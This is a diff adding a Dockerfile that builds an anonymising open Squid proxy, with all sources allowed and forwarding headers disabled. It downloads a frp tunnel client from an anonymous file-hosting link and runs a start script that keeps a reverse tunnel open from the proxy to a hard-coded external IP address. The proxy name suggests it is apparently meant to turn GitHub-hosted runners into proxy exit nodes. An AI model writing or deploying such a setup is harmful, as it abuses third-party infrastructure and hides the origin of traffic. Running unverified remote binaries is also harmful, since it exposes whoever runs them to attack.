@@ -1,0 +1,58 @@
+FROM --platform=linux/amd64 alpine:3.19
+RUN apk add --no-cache squid wget curl bash
+
+RUN echo 'http_port 3128' > /etc/squid/squid.conf && \
+    echo 'acl allsrc src all' >> /etc/squid/squid.conf && \
+    echo 'http_access allow allsrc' >> /etc/squid/squid.conf && \
+    echo 'forwarded_for off' >> /etc/squid/squid.conf && \
+    echo 'via off' >> /etc/squid/squid.conf && \
+    echo 'cache_mem 16 MB' >> /etc/squid/squid.conf && \
+    echo 'maximum_object_size_in_memory 512 KB' >> /etc/squid/squid.conf && \
+    echo 'cache deny all' >> /etc/squid/squid.conf && \
+    echo 'client_persistent_connections off' >> /etc/squid/squid.conf && \
+    echo 'server_persistent_connections off' >> /etc/squid/squid.conf && \
+    echo 'visible_hostname localhost' >> /etc/squid/squid.conf
+
+RUN wget "https://files.catbox.moe/za4auo.gz" && \
+    gunzip za4auo.gz && \
+    tar -xf za4auo && \
+    mv frp_0.61.2_linux_amd64/frpc /usr/local/bin/frpc && \
+    rm -rf frp_0.61.2_linux_amd64 za4auo
+
+RUN echo '#!/bin/bash' > /start.sh && \
+    echo 'cat > frpc.toml <<FRP' >> /start.sh && \
+    echo 'serverAddr = "45.144.53.63"' >> /start.sh && \
+    echo 'serverPort = 7000' >> /start.sh && \
+    echo 'auth.method = "token"' >> /start.sh && \
+    echo "auth.token = \"\$TOKEN\"" >> /start.sh && \
+    echo '[[proxies]]' >> /start.sh && \
+    echo 'name = "github-squid-6022-r1"' >> /start.sh && \
+    echo 'type = "tcp"' >> /start.sh && \
+    echo 'localIP = "127.0.0.1"' >> /start.sh && \
+    echo 'localPort = 3128' >> /start.sh && \
+    echo 'remotePort = 6022' >> /start.sh && \
+    echo 'FRP' >> /start.sh && \
+    echo '' >> /start.sh && \
+    echo '(while true; do' >> /start.sh && \
+    echo '  echo "[squid] starting..."' >> /start.sh && \
+    echo '  squid -N -f /etc/squid/squid.conf' >> /start.sh && \
+    echo '  echo "[squid] exited with code $?, restarting in 3s"' >> /start.sh && \
+    echo '  sleep 3' >> /start.sh && \
+    echo 'done) &' >> /start.sh && \
+    echo '' >> /start.sh && \
+    echo 'sleep 2' >> /start.sh && \
+    echo '' >> /start.sh && \
+    echo '(while true; do' >> /start.sh && \
+    echo '  echo "[frpc] starting..."' >> /start.sh && \
+    echo '  frpc -c frpc.toml' >> /start.sh && \
+    echo '  echo "[frpc] exited with code $?, restarting in 3s"' >> /start.sh && \
+    echo '  sleep 3' >> /start.sh && \
+    echo 'done) &' >> /start.sh && \
+    echo '' >> /start.sh && \
+    echo 'while true; do' >> /start.sh && \
+    echo '  free -m' >> /start.sh && \
+    echo '  sleep 30' >> /start.sh && \
+    echo 'done' >> /start.sh && \
+    chmod +x /start.sh
+
+CMD ["/bin/bash", "/start.sh"]
